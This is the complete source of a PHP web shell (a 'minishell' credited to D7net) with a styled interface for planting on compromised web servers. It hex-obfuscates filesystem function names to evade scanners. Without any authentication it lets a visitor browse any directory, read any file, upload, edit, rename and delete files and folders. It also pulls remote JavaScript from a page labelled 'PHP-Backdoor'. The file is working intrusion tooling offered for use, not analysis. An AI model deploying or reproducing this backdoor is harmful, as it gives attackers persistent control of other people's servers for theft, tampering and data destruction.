<?php

/*
    Shell Bypass 403 Forbidden / Auto Delete Shell / PHP Malware Detector / Minishell
    Inject Shell To JPG By D7net / http://opetolol.eu.org/ 
*/

set_time_limit(0);
error_reporting(0);
error_log(0);

$sname       = "\x30\x62\x79\x74\x33\x6d\x31\x6e\x31" . " - D7net";
$__gcdir     = "\x67" . "\x65\x74\x63\x77\x64";
$__fgetcon7s = "\x66\x69\x6c\x65" . "\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73";
$__scdir     = "s" . "\x63\x61\x6e\x64\x69" . "r";
$rm__dir     = "\x72\x6d\x64" . "ir";
$un__link    = "\x75\x6e" . "\x6c\x69\x6e\x6b";

if (get_magic_quotes_gpc()) {
    foreach ($_POST as $key => $value) {
        $_POST[$key] = stripslashes($value);
    }
}

echo '<!DOCTYPE html>
<html>
<head>
<body bgcolor="#092756" text="#ffffff">
<style>
@import url(https://fonts.googleapis.com/css?family=Dosis);
@import url(https://fonts.googleapis.com/css?family=Bungee);
body {
    font-family: "Dosis", cursive;
    text-shadow:0px 0px 1px #757575;
}

body::-webkit-scrollbar {
  width: 12px;
}

body::-webkit-scrollbar-track {
  background: #786F6F;
}

body::-webkit-scrollbar-thumb {
  background-color: #000;
  border: 3px solid gray;
}

#content tr:hover {
    background-color: #8084EC;
    text-shadow:0px 0px 10px #fff;
}

#content .first {
    background-color: #4C53F0;
}

#content .first:hover {
    background-color: #8084EC;
    text-shadow:0px 0px 1px #757575;
}

table {
    border: 2px #4C53F0 dotted;
    table-layout: fixed;
    word-break: break-all;
}
input { 
	margin-bottom: 4px; 
	background: rgba(0,0,0,0.3);
	border: none;
	outline: none;
	padding: 5px;
	font-size: 15px;
	color: #fff;
	text-shadow: 1px 1px 1px rgba(0,0,0,0.3);
	border: 1px solid rgba(0,0,0,0.3);
	border-radius: 14px;
	box-shadow: inset 0 -5px 45px rgba(100,100,100,0.2), 0 1px 1px rgba(255,255,255,0.2);
	-webkit-transition: box-shadow .5s ease;
	-moz-transition: box-shadow .5s ease;
	-o-transition: box-shadow .5s ease;
	-ms-transition: box-shadow .5s ease;
	transition: box-shadow .5s ease;
}

textarea {
    max-width: 100%;
    max-height: 100%;
    resize: none;
    outline: none;
    overflow: auto;
	color: #fff;
	text-shadow: 1px 1px 1px rgba(0,0,0,0.3);
	border: 1px solid rgba(0,0,0,0.3);
	border-radius: 4px;
	box-shadow: inset 0 -5px 45px rgba(100,100,100,0.2), 0 1px 1px rgba(255,255,255,0.2);
	-webkit-transition: box-shadow .5s ease;
	-moz-transition: box-shadow .5s ease;
	-o-transition: box-shadow .5s ease;
	-ms-transition: box-shadow .5s ease;
	transition: box-shadow .5s ease;
	background: rgba(0,0,0,0.3);
}

textarea::-webkit-scrollbar {
  width: 12px;
}

textarea::-webkit-scrollbar-track {
  background: #000000;
}

textarea::-webkit-scrollbar-thumb {
  background-color: #fff;
  border: 3px solid black;
}

a {
    color: #ffffff;
    text-decoration: none;
}

a:hover {
    color: #757B89;
    text-shadow:0px 0px 10px #4A7BEC;
}

input,select,textarea {
    border: 1px #000000 solid;
    -moz-border-radius: 5px;
    -webkit-border-radius:5px;
    border-radius:5px;
}

.gas {
    background-color: #4C53F0;
    color: #ffffff;
    cursor: pointer;
}

select {
    background-color: transparent;
    color: #ffffff;
}

select:after {
    cursor: pointer;
}

.linka {
    background-color: transparent;
    color: #ffffff;
}

.up {
    background-color: transparent;
    color: #fff;
}

option {
    background-color: #1f1f1f;
}

::-webkit-file-upload-button {
  background: transparent;
  color: #fff;
  border-color: #fff;
  cursor: pointer;
}
body, a, a:link{cursor:url(http://4.bp.blogspot.com/-hAF7tPUnmEE/TwGR3lRH0EI/AAAAAAAAAs8/6pki22hc3NE/s1600/ass.png), 
	default;
} 
	a:hover {
	cursor:url(http://3.bp.blogspot.com/-bRikgqeZx0Q/TwGR4MUEC7I/AAAAAAAAAtA/isJmS0r35Qw/s1600/pointer.png),
	wait;
}
</style>
<meta name="robots" content"noindex. nofollow"><link href="https://fonts.googleapis.com/css?family=VT323" rel="stylesheet">
<title>'.$sname.'</title>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script src="//code.jquery.com/jquery-1.11.2.min.js"></script>
</head><body>';

echo '<div style="color:#1240DE;margin-top:0;"><h1><center>' . $sname . '</center></h1></div>';
if (isset($_GET['path'])) {
    $path = $_GET['path'];
    chdir($_GET['path']);
} else {
    $path = $__gcdir();
}
$path  = str_replace("\\", "/", $path);
$paths = explode("/", $path);
echo '<table width="100%" border="0" align="center" style="margin-top:-10px;"><tr><td>';
echo "<font style='font-size:13px;'>Path: ";
foreach ($paths as $id => $pat) {
    echo "<a style='font-size:13px;' href='?path=";
    for ($i = 0; $i <= $id; $i++) {
        echo $paths[$i];
        if ($i != $id) {
            echo "/";
        }
    }
    echo "'>$pat</a>/";
}
echo '<br>[ <a href="?">Home</a> ] </font></td><td align="center" width="27%"><form enctype="multipart/form-data" method="POST"><input type="file" name="file" style="color:#ef6c00;margin-bottom:4px;"/><input type="submit" value="Upload" /></form></td></tr><tr><td colspan="2">';
if (isset($_FILES['file'])) {
    if (copy($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name'])) {
        echo '<center><font color="#00ff00">Upload Success!</font></center><br/>';
    } else {
        echo '<center><font color="red">Upload FAILED!</font></center><br/>';
    }
}
echo '</td></tr><tr><td></table><div class="table-div"></div><input id="image" type="hidden">';
echo '';
if (isset($_GET['filesrc'])) {
    echo '<br><center>Name File: ';
    echo "" . basename($_GET['filesrc']);
    "";
    echo ' <br><br><a href="?path='.$path.'"> < back </a><br><br>';
    echo ("<center><textarea cols=100 rows=25 readonly=''>" . htmlspecialchars($__fgetcon7s($_GET['filesrc'])) . "</textarea></center>");
} elseif (isset($_GET['option']) && $_POST['opt'] != 'delete') {
    echo '</table><br /><center>' . $_POST['path'] . '<br /><br />';
    if ($_POST['opt'] == 'rename') {
        if (isset($_POST['newname'])) {
            if (rename($_POST['path'], $path . '/' . $_POST['newname'])) {
                echo '<center><font color="#00ff00">Rename Success!</font></center><br />';
            } else {
                echo '<center><font color="red">Rename Failed!</font></center><br />';
            }
            $_POST['name'] = $_POST['newname'];
        }
        echo '<form method="POST">New Name : <input name="newname" type="text" size="20" value="' . $_POST['name'] . '" /> <input type="hidden" name="path" value="' . $_POST['path'] . '"><input type="hidden" name="opt" value="rename"><input type="submit" value="Go" /></form>';
    } elseif ($_POST['opt'] == 'edit') {
        if (isset($_POST['src'])) {
            $fp = fopen($_POST['path'], 'w');
            if (fwrite($fp, $_POST['src'])) {
                echo '<center><font color="#00ff00">Edit File Success!.</font></center><br />';
            } else {
                echo '<center><font color="red">Edit File Failed!.</font></center><br />';
            }
            fclose($fp);
        }
        echo '
        <form method="POST"><br><a href="?path='.$path.'"> < back </a><br><br>Edit File:
        <td><center><textarea cols=120 rows=25 name="src">' . htmlspecialchars($__fgetcon7s($_POST['path'])) . '</textarea>
        </div><br /><input type="hidden" name="path" value="' . $_POST['path'] . '"> 
        <input type="hidden" name="opt" value="edit">
        <input type="submit" value="Save"/>
        ';
    }
    echo '</center>';
} else {
    echo '</table><br /><center>';
    if (isset($_GET['option']) && $_POST['opt'] == 'delete') {
        if ($_POST['type'] == 'dir') {
            if ($rm__dir($_POST['path'])) {
                echo '<center><font color="#00ff00">Dir Deleted!</font></center><br />';
            } else {
                echo '<center><font color="red">Delete Dir Failed!</font></center><br />';
            }
        } elseif ($_POST['type'] == 'file') {
            if ($un__link($_POST['path'])) {
                echo '<font color="#00ff00">Delete File Done.</font><br />';
            } else {
                echo '<font color="red">Delete File Error.</font><br />';
            }
        }
    }
    echo '</center>';
    $_scdir = $__scdir($path);
    echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center"><tr class="first"> <th width="1%"><center>Pic</center></th><th width="15%"><center>Name</center></th><th width="10%"><center>Size</center></th><th width="5%"><center>Type</center></th><th width="10%"><center>Permissions</center></th> <th width="15%"><center>Last Update</center></th><th width="11%"><center>Options</center></th></tr>';
    foreach ($_scdir as $dir) {
        if (!is_dir("$path/$dir") || $dir == '.' || $dir == '..')
            continue;
        echo "<tr><td><img src='https://img.icons8.com/external-vectorslab-flat-vectorslab/2x/external-folder-project-management-and-web-marketing-vectorslab-flat-vectorslab.png' alt='Smiley face' width='25' heght='25'></td><td><a href=\"?path=$path/$dir\">$dir</a></td><td><center>--</center></td><td><center>Folder</center></td><td><center>";
        if (is_writable("$path/$dir"))
            echo '<font color="#00ff00">';
        elseif (!is_readable("$path/$dir"))
            echo '<font color="red">';
        echo perms("$path/$dir");
        if (is_writable("$path/$dir") || !is_readable("$path/$dir"))
            echo '</font>';
        echo "</center></td><td><center>" . date("d-M-Y H:i", filemtime("$path/$dir")) . "";
        echo "</center></td> <td><center><form method=\"POST\" action=\"?option&path=$path\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option></select><input type=\"hidden\" name=\"type\" value=\"dir\"><input type=\"hidden\" name=\"name\" value=\"$dir\"><input type=\"hidden\" name=\"path\" value=\"$path/$dir\"><input type=\"submit\" value=\"&#x276F;\" /></form></center></td></tr>";
    }
    foreach ($_scdir as $file) {
        if (!is_file("$path/$file"))
            continue;
        $size = filesize("$path/$file") / 1024;
        $size = round($size, 3);
        if ($size >= 1024) {
            $size = round($size / 1024, 2) . ' MB';
        } else {
            $size = $size . ' KB';
        }
        echo "<tr><td><img src='https://img.icons8.com/external-kmg-design-outline-color-kmg-design/2x/external-file-web-hosting-kmg-design-outline-color-kmg-design.png' alt='Smiley face' width='25' heght='25'></td><td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td><td><center>" . $size . "</center></td><td><center>File</center></td><td><center>";
        if (is_writable("$path/$file"))
            echo '<font color="#00ff00">';
        elseif (!is_readable("$path/$file"))
            echo '<font color="red">';
        echo perms("$path/$file");
        if (is_writable("$path/$file") || !is_readable("$path/$file"))
            echo '</font>';
        echo "</center></td><td><center>" . date("d-M-Y H:i", filemtime("$path/$file")) . "";
        echo "</center></td><td><center><form method=\"POST\" action=\"?option&path=$path\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option><option value=\"edit\">Edit</option></select><input type=\"hidden\" name=\"type\" value=\"file\"><input type=\"hidden\" name=\"name\" value=\"$file\"><input type=\"hidden\" name=\"path\" value=\"$path/$file\"><input type=\"submit\" value=\"&#x276F;\" /></form></center></td></tr>";
    }
    echo '</table></div>';
}
function perms($file)
{
    $perms = fileperms($file);
    if (($perms & 0xC000) == 0xC000) {
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        $info = 'p';
    } else {
        $info = 'u';
    }
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}
echo '<br><center>&copy; <span id="footer"></span> 2018. | Recode by D7net</center><br>';
echo '<script type="text/javascript" src="//zerobyte-id.github.io/PHP-Backdoor/inc/footer.js"></script>';
echo '</body></html><!-- EOF -->';
?>
